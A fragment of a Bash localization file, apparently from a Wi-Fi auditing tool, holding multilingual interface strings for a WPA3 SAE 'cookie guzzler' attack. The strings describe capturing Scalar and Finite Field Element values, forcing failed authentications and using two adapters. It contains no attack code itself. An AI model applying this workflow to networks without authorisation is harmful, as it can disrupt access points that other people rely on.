	arr["SPANISH","wpa3_cookie_guzzler_6"]="\${blue_color}Para llevar a cabo este ataque, es necesario tener ciertos datos de un handshake SAE de WPA3 capturados de una autenticación fallida (Scalar y Finite Field Element). Si ya dispones de estos datos, podrás introducirlos manualmente. Si no, se procederá a su captura y para ello harán falta dos adaptadores inalámbricos. \${green_color}¿Dispones ya de estos datos y quieres introducirlos manualmente? \${normal_color}\${visual_choice}"
	arr["FRENCH","wpa3_cookie_guzzler_6"]="\${pending_of_translation} \${blue_color}Pour mener cette attaque, il est nécessaire de disposer de certaines données d’un handshake SAE WPA3 capturées à partir d’une authentification échouée (Scalar et Finite Field Element). Si tu disposes déjà de ces données, tu pourras les saisir manuellement. Sinon, elles seront capturées et deux adaptateurs sans fil seront nécessaires pour cela. \${green_color}Disposes-tu déjà de ces données et souhaites-tu les saisir manuellement? \${normal_color}\${visual_choice}"
	arr["CATALAN","wpa3_cookie_guzzler_6"]="\${pending_of_translation} \${blue_color}Per dur a terme aquest atac, cal disposar de certes dades d’un handshake SAE de WPA3 capturades a partir d’una autenticació fallida (Scalar i Finite Field Element). Si ja disposes d’aquestes dades, podràs introduir-les manualment. Si no, es procedirà a la seva captura i per a això caldran dos adaptadors sense fil. \${green_color}¿Ja disposes d’aquestes dades i vols introduir-les manualment? \${normal_color}\${visual_choice}"
	arr["PORTUGUESE","wpa3_cookie_guzzler_6"]="\${pending_of_translation} \${blue_color}Para realizar este ataque, é necessário ter certos dados de um handshake SAE de WPA3 capturados a partir de uma autenticação falhada (Scalar e Finite Field Element). Se já dispões desses dados, poderás inseri-los manualmente. Caso contrário, eles serão capturados e para isso serão necessários dois adaptadores sem fios. \${green_color}Já dispões desses dados e queres inseri-los manualmente? \${normal_color}\${visual_choice}"
	arr["RUSSIAN","wpa3_cookie_guzzler_6"]="\${pending_of_translation} \${blue_color}Для выполнения этой атаки необходимо иметь некоторые данные из handshake SAE WPA3, полученные при неудачной аутентификации (Scalar и Finite Field Element). Если у тебя уже есть эти данные, ты можешь ввести их вручную. В противном случае они будут захвачены, и для этого потребуются два беспроводных адаптера. \${green_color}У тебя уже есть эти данные и ты хочешь ввести их вручную? \${normal_color}\${visual_choice}"
	arr["GREEK","wpa3_cookie_guzzler_6"]="\${pending_of_translation} \${blue_color}Για να πραγματοποιήσεις αυτή την επίθεση, είναι απαραίτητο να υπάρχουν ορισμένα δεδομένα από ένα handshake SAE του WPA3 που έχουν καταγραφεί από μια αποτυχημένη αυθεντικοποίηση (Scalar και Finite Field Element). Αν διαθέτεις ήδη αυτά τα δεδομένα, μπορείς να τα εισαγάγεις χειροκίνητα. Διαφορετικά, θα καταγραφούν και για αυτό θα χρειαστούν δύο ασύρματοι προσαρμογείς. \${green_color}Διαθέτεις ήδη αυτά τα δεδομένα και θέλεις να τα εισαγάγεις χειροκίνητα? \${normal_color}\${visual_choice}"
	arr["ITALIAN","wpa3_cookie_guzzler_6"]="\${pending_of_translation} \${blue_color}Per eseguire questo attacco, è necessario disporre di alcuni dati di un handshake SAE WPA3 catturati da un’autenticazione fallita (Scalar e Finite Field Element). Se disponi già di questi dati, potrai inserirli manualmente. In caso contrario, verranno catturati e per farlo saranno necessari due adattatori wireless. \${green_color}Disponi già di questi dati e vuoi inserirli manualmente? \${normal_color}\${visual_choice}"
	arr["POLISH","wpa3_cookie_guzzler_6"]="\${pending_of_translation} \${blue_color}Aby przeprowadzić ten atak, konieczne jest posiadanie pewnych danych z handshake SAE WPA3 przechwyconych podczas nieudanej autoryzacji (Scalar i Finite Field Element). Jeśli już posiadasz te dane, możesz wprowadzić je ręcznie. W przeciwnym razie zostaną one przechwycone i do tego będą potrzebne dwa adaptery bezprzewodowe. \${green_color}Czy posiadasz już te dane i chcesz wprowadzić je ręcznie? \${normal_color}\${visual_choice}"
	arr["GERMAN","wpa3_cookie_guzzler_6"]="\${pending_of_translation} \${blue_color}Um diesen Angriff durchzuführen, müssen bestimmte Daten aus einem WPA3-SAE-Handshake vorliegen, die bei einer fehlgeschlagenen Authentifizierung erfasst wurden (Scalar und Finite Field Element). Wenn du diese Daten bereits hast, kannst du sie manuell eingeben. Andernfalls werden sie erfasst, wofür zwei WLAN-Adapter erforderlich sind. \${green_color}Hast du diese Daten bereits und möchtest du sie manuell eingeben? \${normal_color}\${visual_choice}"
	arr["TURKISH","wpa3_cookie_guzzler_6"]="\${pending_of_translation} \${blue_color}Bu saldırıyı gerçekleştirmek için başarısız bir kimlik doğrulama sonucunda yakalanmış bir WPA3 SAE handshake’ine ait bazı verilerin bulunması gerekir (Scalar ve Finite Field Element). Bu verilere zaten sahipsen, bunları manuel olarak girebilirsin. Aksi halde veriler yakalanacak ve bunun için iki kablosuz adaptör gerekecektir. \${green_color}Bu verilere zaten sahip misin ve manuel olarak girmek istiyor musun? \${normal_color}\${visual_choice}"
	arr["ARABIC","wpa3_cookie_guzzler_6"]="\${pending_of_translation} \${normal_color}\${visual_choice} \${green_color}هل تمتلك هذه البيانات بالفعل وتريد إدخالها يدوياً؟ \${blue_color}من أجل تنفيذ هذا الهجوم، يجب توفر بعض البيانات من handshake SAE الخاص بـ WPA3 تم التقاطها من مصادقة فاشلة (Scalar و Finite Field Element). إذا كانت هذه البيانات متوفرة لديك، يمكنك إدخالها يدوياً. إذا لم تكن متوفرة، فسيتم التقاطها، ولتحقيق ذلك ستكون هناك حاجة إلى محولين لاسلكيين"
	arr["CHINESE","wpa3_cookie_guzzler_6"]="\${pending_of_translation} \${blue_color}要执行此攻击，需要具备通过一次失败的认证所捕获的 WPA3 SAE 握手中的部分数据（Scalar 和 Finite Field Element）。如果你已经拥有这些数据，可以手动输入。如果没有，则将进行捕获，并且需要两个无线适配器。 \${green_color}你是否已经拥有这些数据并希望手动输入？ \${normal_color}\${visual_choice}"

	arr["ENGLISH","wpa3_cookie_guzzler_7"]="Enter the hexadecimal value of Scalar (64 characters length):"
	arr["SPANISH","wpa3_cookie_guzzler_7"]="Introduce el valor hexadecimal de Scalar (longitud 64 caracteres):"
	arr["FRENCH","wpa3_cookie_guzzler_7"]="\${pending_of_translation} Entre la valeur hexadécimale de Scalar (longueur 64 caractères):"
	arr["CATALAN","wpa3_cookie_guzzler_7"]="\${pending_of_translation} Introdueix el valor hexadecimal de Scalar (longitud 64 caràcters):"
	arr["PORTUGUESE","wpa3_cookie_guzzler_7"]="\${pending_of_translation} Introduz o valor hexadecimal de Scalar (comprimento 64 caracteres):"
	arr["RUSSIAN","wpa3_cookie_guzzler_7"]="\${pending_of_translation} Введи шестнадцатеричное значение Scalar (длина 64 символа):"
	arr["GREEK","wpa3_cookie_guzzler_7"]="\${pending_of_translation} Εισήγαγε την δεκαεξαδική τιμή του Scalar (μήκος 64 χαρακτήρες):"
	arr["ITALIAN","wpa3_cookie_guzzler_7"]="\${pending_of_translation} Inserisci il valore esadecimale di Scalar (lunghezza 64 caratteri):"
	arr["POLISH","wpa3_cookie_guzzler_7"]="\${pending_of_translation} Wprowadź szesnastkową wartość Scalar (długość 64 znaki):"
	arr["GERMAN","wpa3_cookie_guzzler_7"]="\${pending_of_translation} Gib den hexadezimalen Wert von Scalar ein (Länge 64 Zeichen):"
	arr["TURKISH","wpa3_cookie_guzzler_7"]="\${pending_of_translation} Scalar için onaltılık değeri gir (64 karakter uzunluk):"
	arr["ARABIC","wpa3_cookie_guzzler_7"]="\${pending_of_translation} :أدخل القيمة السداسية العشرية لـ Scalar (بطول 64 حرفاً)"
	arr["CHINESE","wpa3_cookie_guzzler_7"]="\${pending_of_translation} 输入 Scalar 的十六进制值（长度为 64 个字符）："

	arr["ENGLISH","wpa3_cookie_guzzler_8"]="Enter the hexadecimal value of Finite Field Element (128 characters length):"
	arr["SPANISH","wpa3_cookie_guzzler_8"]="Introduce el valor hexadecimal de Finite Field Element (longitud 128 caracteres):"
	arr["FRENCH","wpa3_cookie_guzzler_8"]="\${pending_of_translation} Entre la valeur hexadécimale de Finite Field Element (longueur 128 caractères):"
	arr["CATALAN","wpa3_cookie_guzzler_8"]="\${pending_of_translation} Introdueix el valor hexadecimal de Finite Field Element (longitud 128 caràcters):"
	arr["PORTUGUESE","wpa3_cookie_guzzler_8"]="\${pending_of_translation} Introduz o valor hexadecimal de Finite Field Element (comprimento 128 caracteres):"
	arr["RUSSIAN","wpa3_cookie_guzzler_8"]="\${pending_of_translation} Введи шестнадцатеричное значение Finite Field Element (длина 128 символов):"
	arr["GREEK","wpa3_cookie_guzzler_8"]="\${pending_of_translation} Εισήγαγε την δεκαεξαδική τιμή του Finite Field Element (μήκος 128 χαρακτήρες):"
	arr["ITALIAN","wpa3_cookie_guzzler_8"]="\${pending_of_translation} Inserisci il valore esadecimale di Finite Field Element (lunghezza 128 caratteri):"
	arr["POLISH","wpa3_cookie_guzzler_8"]="\${pending_of_translation} Wprowadź szesnastkową wartość Finite Field Element (długość 128 znaków):"
	arr["GERMAN","wpa3_cookie_guzzler_8"]="\${pending_of_translation} Gib den hexadezimalen Wert von Finite Field Element ein (Länge 128 Zeichen):"
	arr["TURKISH","wpa3_cookie_guzzler_8"]="\${pending_of_translation} Finite Field Element için onaltılık değeri gir (128 karakter uzunluk):"
	arr["ARABIC","wpa3_cookie_guzzler_8"]="\${pending_of_translation} :أدخل القيمة السداسية العشرية لـ Finite Field Element (بطول 128 حرفاً)"
	arr["CHINESE","wpa3_cookie_guzzler_8"]="\${pending_of_translation} 输入 Finite Field Element 的十六进制值（长度为 128 个字符）："

	arr["ENGLISH","wpa3_cookie_guzzler_9"]="Scalar value set: \${normal_color}\${scalar}"
	arr["SPANISH","wpa3_cookie_guzzler_9"]="Valor Scalar establecido: \${normal_color}\${scalar}"
	arr["FRENCH","wpa3_cookie_guzzler_9"]="\${pending_of_translation} Valeur Scalar définie: \${normal_color}\${scalar}"
	arr["CATALAN","wpa3_cookie_guzzler_9"]="\${pending_of_translation} Valor Scalar establert: \${normal_color}\${scalar}"
	arr["PORTUGUESE","wpa3_cookie_guzzler_9"]="\${pending_of_translation} Valor Scalar definido: \${normal_color}\${scalar}"
	arr["RUSSIAN","wpa3_cookie_guzzler_9"]="\${pending_of_translation} Значение Scalar установлено: \${normal_color}\${scalar}"
	arr["GREEK","wpa3_cookie_guzzler_9"]="\${pending_of_translation} Η τιμή Scalar ορίστηκε: \${normal_color}\${scalar}"
	arr["ITALIAN","wpa3_cookie_guzzler_9"]="\${pending_of_translation} Valore Scalar impostato: \${normal_color}\${scalar}"
	arr["POLISH","wpa3_cookie_guzzler_9"]="\${pending_of_translation} Wartość Scalar ustawiona: \${normal_color}\${scalar}"
	arr["GERMAN","wpa3_cookie_guzzler_9"]="\${pending_of_translation} Scalar-Wert gesetzt: \${normal_color}\${scalar}"
	arr["TURKISH","wpa3_cookie_guzzler_9"]="\${pending_of_translation} Scalar değeri ayarlandı: \${normal_color}\${scalar}"
	arr["ARABIC","wpa3_cookie_guzzler_9"]="\${pending_of_translation} \${normal_color}\${scalar} \${blue_color}:تم تعيين قيمة Scalar"
	arr["CHINESE","wpa3_cookie_guzzler_9"]="\${pending_of_translation} 已设置 Scalar 值：\${normal_color}\${scalar}"

	arr["ENGLISH","wpa3_cookie_guzzler_10"]="Finite Field Element value set: \${normal_color}\${finite_field_element}"
	arr["SPANISH","wpa3_cookie_guzzler_10"]="Valor Finite Field Element establecido: \${normal_color}\${finite_field_element}"
	arr["FRENCH","wpa3_cookie_guzzler_10"]="\${pending_of_translation} Valeur Finite Field Element définie: \${normal_color}\${finite_field_element}"
	arr["CATALAN","wpa3_cookie_guzzler_10"]="\${pending_of_translation} Valor Finite Field Element establert: \${normal_color}\${finite_field_element}"
	arr["PORTUGUESE","wpa3_cookie_guzzler_10"]="\${pending_of_translation} Valor Finite Field Element definido: \${normal_color}\${finite_field_element}"
	arr["RUSSIAN","wpa3_cookie_guzzler_10"]="\${pending_of_translation} Значение Finite Field Element установлено: \${normal_color}\${finite_field_element}"
	arr["GREEK","wpa3_cookie_guzzler_10"]="\${pending_of_translation} Η τιμή Finite Field Element ορίστηκε: \${normal_color}\${finite_field_element}"
	arr["ITALIAN","wpa3_cookie_guzzler_10"]="\${pending_of_translation} Valore Finite Field Element impostato: \${normal_color}\${finite_field_element}"
	arr["POLISH","wpa3_cookie_guzzler_10"]="\${pending_of_translation} Wartość Finite Field Element ustawiona: \${normal_color}\${finite_field_element}"
	arr["GERMAN","wpa3_cookie_guzzler_10"]="\${pending_of_translation} Finite-Field-Element-Wert gesetzt: \${normal_color}\${finite_field_element}"
	arr["TURKISH","wpa3_cookie_guzzler_10"]="\${pending_of_translation} Finite Field Element değeri ayarlandı: \${normal_color}\${finite_field_element}"
	arr["ARABIC","wpa3_cookie_guzzler_10"]="\${pending_of_translation} \${normal_color}\${finite_field_element} \${blue_color}:تم تعيين قيمة Finite Field Element"
	arr["CHINESE","wpa3_cookie_guzzler_10"]="\${pending_of_translation} 已设置 Finite Field Element 值：\${normal_color}\${finite_field_element}"

	arr["ENGLISH","wpa3_cookie_guzzler_11"]="Two windows will be opened, one to capture the required data and another to force a failed authentication. Do not touch anything during the process"
	arr["SPANISH","wpa3_cookie_guzzler_11"]="Se abrirán dos ventanas, una para capturar el dato necesario y otra para forzar una autenticación fallida. No toques nada durante el proceso"
	arr["FRENCH","wpa3_cookie_guzzler_11"]="\${pending_of_translation} Deux fenêtres vont s’ouvrir, une pour capturer la donnée nécessaire et une autre pour forcer une authentification échouée. Ne touche à rien pendant le processus"
	arr["CATALAN","wpa3_cookie_guzzler_11"]="\${pending_of_translation} S’obriran dues finestres, una per capturar la dada necessària i una altra per forçar una autenticació fallida. No toquis res durant el procés"
	arr["PORTUGUESE","wpa3_cookie_guzzler_11"]="\${pending_of_translation} Serão abertas duas janelas, uma para capturar o dado necessário e outra para forçar uma autenticação falhada. Não toques em nada durante o processo"
	arr["RUSSIAN","wpa3_cookie_guzzler_11"]="\${pending_of_translation} Будут открыты два окна, одно для захвата необходимых данных и другое для принудительного сбоя аутентификации. Ничего не трогай во время процесса"
	arr["GREEK","wpa3_cookie_guzzler_11"]="\${pending_of_translation} Θα ανοίξουν δύο παράθυρα, ένα για τη σύλληψη των απαραίτητων δεδομένων και ένα άλλο για την εξαναγκασμένη αποτυχημένη αυθεντικοποίηση. Μην αγγίξεις τίποτα κατά τη διάρκεια της διαδικασίας"
	arr["ITALIAN","wpa3_cookie_guzzler_11"]="\${pending_of_translation} Si apriranno due finestre, una per catturare il dato necessario e un’altra per forzare un’autenticazione fallita. Non toccare nulla durante il processo"
	arr["POLISH","wpa3_cookie_guzzler_11"]="\${pending_of_translation} Zostaną otwarte dwa okna, jedno do przechwycenia wymaganych danych i drugie do wymuszenia nieudanej autoryzacji. Nie dotykaj niczego podczas procesu"
	arr["GERMAN","wpa3_cookie_guzzler_11"]="\${pending_of_translation} Es werden zwei Fenster geöffnet, eines zum Erfassen der benötigten Daten und ein weiteres zum Erzwingen einer fehlgeschlagenen Authentifizierung. Berühre während des Vorgangs nichts"
	arr["TURKISH","wpa3_cookie_guzzler_11"]="\${pending_of_translation} İki pencere açılacak, biri gerekli veriyi yakalamak için diğeri başarısız bir kimlik doğrulama zorlamak için. İşlem sırasında hiçbir şeye dokunma"
	arr["ARABIC","wpa3_cookie_guzzler_11"]="\${pending_of_translation} لا تلمس أي شيء أثناء العملية. سيتم فتح نافذتين، واحدة لالتقاط البيانات المطلوبة وأخرى لفرض فشل المصادقة"
	arr["CHINESE","wpa3_cookie_guzzler_11"]="\${pending_of_translation} 将打开两个窗口，一个用于捕获所需数据，另一个用于强制认证失败。过程中不要触碰任何东西"

	arr["ENGLISH","wpa3_cookie_guzzler_12"]="Failed to capture the SAE data (Scalar and Finite Field Element). Please try again"
	arr["SPANISH","wpa3_cookie_guzzler_12"]="No se pudieron capturar los datos SAE (Scalar y Finite Field Element). Inténtalo de nuevo"
	arr["FRENCH","wpa3_cookie_guzzler_12"]="\${pending_of_translation} Échec de la capture des données SAE (Scalar et Finite Field Element). Réessaie"
	arr["CATALAN","wpa3_cookie_guzzler_12"]="\${pending_of_translation} No s’ha pogut capturar la dada SAE (Scalar i Finite Field Element). Torna-ho a provar"
	arr["PORTUGUESE","wpa3_cookie_guzzler_12"]="\${pending_of_translation} Falha ao capturar o dado SAE (Scalar e Finite Field Element). Tenta novamente"
	arr["RUSSIAN","wpa3_cookie_guzzler_12"]="\${pending_of_translation} Не удалось захватить данные SAE (Scalar и Finite Field Element). Попробуй снова"
	arr["GREEK","wpa3_cookie_guzzler_12"]="\${pending_of_translation} Αποτυχία σύλληψης των δεδομένων SAE (Scalar και Finite Field Element). Προσπάθησε ξανά"
	arr["ITALIAN","wpa3_cookie_guzzler_12"]="\${pending_of_translation} Impossibile catturare il dato SAE (Scalar e Finite Field Element). Riprova"
	arr["POLISH","wpa3_cookie_guzzler_12"]="\${pending_of_translation} Nie udało się przechwycić danych SAE (Scalar i Finite Field Element). Spróbuj ponownie"
	arr["GERMAN","wpa3_cookie_guzzler_12"]="\${pending_of_translation} Erfassen der SAE-Daten (Scalar und Finite Field Element) fehlgeschlagen. Bitte versuche es erneut"
	arr["TURKISH","wpa3_cookie_guzzler_12"]="\${pending_of_translation} SAE verileri (Scalar ve Finite Field Element) yakalanamadı. Tekrar dene"
	arr["ARABIC","wpa3_cookie_guzzler_12"]="\${pending_of_translation} حاول مرة أخرى. فشل التقاط بيانات SAE (Scalar و Finite Field Element)"
	arr["CHINESE","wpa3_cookie_guzzler_12"]="\${pending_of_translation} 无法捕获 SAE 数据（Scalar 和 Finite Field Element）。请再试一次"

	arr["ENGLISH","wpa3_cookie_guzzler_13"]="The SAE values of Scalar and Finite Field Element have been successfully captured. Write them down to avoid having to capture them again in future occasions. Remember that these values are valid exclusively for this target. For another target (even with the same ESSID) on another band or another BSSID, they would not work"
	arr["SPANISH","wpa3_cookie_guzzler_13"]="Los valores SAE de Scalar y Finite Field Element se han capturado con éxito. Anótalos para poder evitar tener que capturarlos de nuevo en futuras ocasiones. Recuerda que estos valores son válidos exclusivamente para este objetivo. Para otro objetivo (incluso con el mismo ESSID) en otra banda u otro BSSID, no servirían"
	arr["FRENCH","wpa3_cookie_guzzler_13"]="\${pending_of_translation} Les valeurs SAE de Scalar et Finite Field Element ont été capturées avec succès. Note-les pour éviter de devoir les capturer à nouveau à l’avenir. Souviens-toi que ces valeurs sont valables exclusivement pour cette cible. Pour une autre cible (même avec le même ESSID) sur une autre bande ou un autre BSSID, elles ne fonctionneraient pas"
	arr["CATALAN","wpa3_cookie_guzzler_13"]="\${pending_of_translation} Els valors SAE de Scalar i Finite Field Element s’han capturat amb èxit. Anota’ls per evitar haver-los de capturar de nou en futures ocasions. Recorda que aquests valors són vàlids exclusivament per a aquest objectiu. Per a un altre objectiu (fins i tot amb el mateix ESSID) en una altra banda o un altre BSSID, no servirien"
	arr["PORTUGUESE","wpa3_cookie_guzzler_13"]="\${pending_of_translation} Os valores SAE de Scalar e Finite Field Element foram capturados com sucesso. Anota-os para evitar ter de os capturar novamente em futuras ocasiões. Lembra-te que estes valores são válidos exclusivamente para este alvo. Para outro alvo (mesmo com o mesmo ESSID) noutra banda ou noutro BSSID, não funcionariam"
	arr["RUSSIAN","wpa3_cookie_guzzler_13"]="\${pending_of_translation} Значения SAE для Scalar и Finite Field Element были успешно захвачены. Запиши их, чтобы избежать повторного захвата в будущем. Помни, что эти значения действительны исключительно для этой цели. Для другой цели (даже с тем же ESSID) на другом диапазоне или с другим BSSID они не подойдут"
	arr["GREEK","wpa3_cookie_guzzler_13"]="\${pending_of_translation} Οι τιμές SAE των Scalar και Finite Field Element καταγράφηκαν με επιτυχία. Σημείωσέ τες για να αποφύγεις το να χρειαστεί να τις καταγράψεις ξανά στο μέλλον. Θυμήσου ότι αυτές οι τιμές ισχύουν αποκλειστικά για αυτόν τον στόχο. Για άλλον στόχο (ακόμα και με το ίδιο ESSID) σε άλλη μπάντα ή άλλο BSSID, δεν θα λειτουργούσαν"
	arr["ITALIAN","wpa3_cookie_guzzler_13"]="\${pending_of_translation} I valori SAE di Scalar e Finite Field Element sono stati catturati con successo. Annotali per evitare di doverli catturare di nuovo in futuro. Ricorda che questi valori sono validi esclusivamente per questo obiettivo. Per un altro obiettivo (anche con lo stesso ESSID) su un’altra banda o un altro BSSID, non funzionerebbero"
	arr["POLISH","wpa3_cookie_guzzler_13"]="\${pending_of_translation} Wartości SAE dla Scalar i Finite Field Element zostały pomyślnie przechwycone. Zapisz je, aby uniknąć konieczności ponownego przechwytywania w przyszłości. Pamiętaj, że te wartości są ważne wyłącznie dla tego celu. Dla innego celu (nawet z tym samym ESSID) na innym paśmie lub z innym BSSID nie zadziałałyby"
	arr["GERMAN","wpa3_cookie_guzzler_13"]="\${pending_of_translation} Die SAE-Werte von Scalar und Finite Field Element wurden erfolgreich erfasst. Notiere sie, um zu vermeiden, sie in Zukunft erneut erfassen zu müssen. Denk daran, dass diese Werte ausschließlich für dieses Ziel gültig sind. Für ein anderes Ziel (selbst mit derselben ESSID) auf einem anderen Band oder mit einer anderen BSSID würden sie nicht funktionieren"
	arr["TURKISH","wpa3_cookie_guzzler_13"]="\${pending_of_translation} Scalar ve Finite Field Element için SAE değerleri başarıyla yakalandı. Gelecekte tekrar yakalamak zorunda kalmamak için bunları not al. Bu değerlerin yalnızca bu hedef için geçerli olduğunu unutma. Başka bir hedef için (aynı ESSID olsa bile) başka bir bantta veya başka bir BSSID ile işe yaramazlar"
	arr["ARABIC","wpa3_cookie_guzzler_13"]="\${pending_of_translation} تم التقاط قيم SAE الخاصة بـ Scalar و Finite Field Element بنجاح. دوّنها لتجنب الحاجة إلى التقاطها مرة أخرى في المستقبل. تذكّر أن هذه القيم صالحة حصرياً لهذا الهدف. لهدف آخر (حتى مع نفس ESSID) وعلى نطاق آخر أو BSSID مختلف، فلن تعمل"
	arr["CHINESE","wpa3_cookie_guzzler_13"]="\${pending_of_translation} 已成功捕获 Scalar 和 Finite Field Element 的 SAE 值。请将其记录下来，以避免将来需要再次捕获。请记住，这些值仅对该目标有效。对于其他目标（即使使用相同的 ESSID），在其他频段或其他 BSSID 下也无法使用"

	arr["ENGLISH","wpa3_cookie_guzzler_14"]="The secondary adapter must be in managed mode to perform this attack. The change will be done automatically"
	arr["SPANISH","wpa3_cookie_guzzler_14"]="El adaptador secundario ha de estar en modo managed para poder realizar este ataque. Se realizará el cambio automáticamente"
	arr["FRENCH","wpa3_cookie_guzzler_14"]="\${pending_of_translation} L’adaptateur secondaire doit être en mode managed pour pouvoir réaliser cette attaque. Le changement sera effectué automatiquement"
	arr["CATALAN","wpa3_cookie_guzzler_14"]="\${pending_of_translation} L’adaptador secundari ha d’estar en mode managed per poder realitzar aquest atac. El canvi es farà automàticament"
	arr["PORTUGUESE","wpa3_cookie_guzzler_14"]="\${pending_of_translation} O adaptador secundário tem de estar em modo managed para realizar este ataque. A alteração será feita automaticamente"
	arr["RUSSIAN","wpa3_cookie_guzzler_14"]="\${pending_of_translation} Вторичный адаптер должен быть в режиме managed для выполнения этой атаки. Изменение будет выполнено автоматически"
	arr["GREEK","wpa3_cookie_guzzler_14"]="\${pending_of_translation} Ο δευτερεύων προσαρμογέας πρέπει να είναι σε λειτουργία managed για να πραγματοποιηθεί αυτή η επίθεση. Η αλλαγή θα γίνει αυτόματα"
	arr["ITALIAN","wpa3_cookie_guzzler_14"]="\${pending_of_translation} L’adattatore secondario deve essere in modalità managed per poter eseguire questo attacco. La modifica verrà effettuata automaticamente"
	arr["POLISH","wpa3_cookie_guzzler_14"]="\${pending_of_translation} Wtórny adapter musi być w trybie managed, aby przeprowadzić ten atak. Zmiana zostanie wykonana automatycznie"
	arr["GERMAN","wpa3_cookie_guzzler_14"]="\${pending_of_translation} Der sekundäre Adapter muss sich im Managed-Modus befinden, um diesen Angriff durchzuführen. Die Änderung wird automatisch vorgenommen"
	arr["TURKISH","wpa3_cookie_guzzler_14"]="\${pending_of_translation} Bu saldırıyı gerçekleştirebilmek için ikincil adaptörün managed modunda olması gerekir. Değişiklik otomatik olarak yapılacaktır"
	arr["ARABIC","wpa3_cookie_guzzler_14"]="\${pending_of_translation} يجب أن يكون المحول الثانوي في وضع managed لتنفيذ هذا الهجوم. سيتم إجراء التغيير تلقائياً"
	arr["CHINESE","wpa3_cookie_guzzler_14"]="\${pending_of_translation} 要执行此攻击，辅助适配器必须处于 managed 模式。该更改将自动完成"
}
